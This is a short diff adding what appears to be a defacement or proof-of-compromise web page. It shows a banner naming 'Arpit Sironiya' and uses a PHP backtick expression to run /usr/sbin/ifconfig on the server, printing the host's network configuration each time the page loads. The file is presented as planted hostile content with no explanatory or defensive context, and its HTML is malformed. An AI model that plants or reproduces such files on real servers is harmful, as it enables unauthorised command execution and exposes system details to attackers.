@@ -1,0 +1,1 @@
+<body style="background-image: url(https://raw.githubusercontent.com/farista2/aaaaa-/master/208b9fbe488654dfd0413c01a7524873.png);"><pre><u><h2><center><b><h1>HelLo Friend Its Me Arpit Sironiya</u></h2></b></center></h2><h3><dialog open style="background-color:powderblue;" >  <?php print `/usr/sbin/ifconfig`;?></pre>  </dialog></h3></pre></body></html>
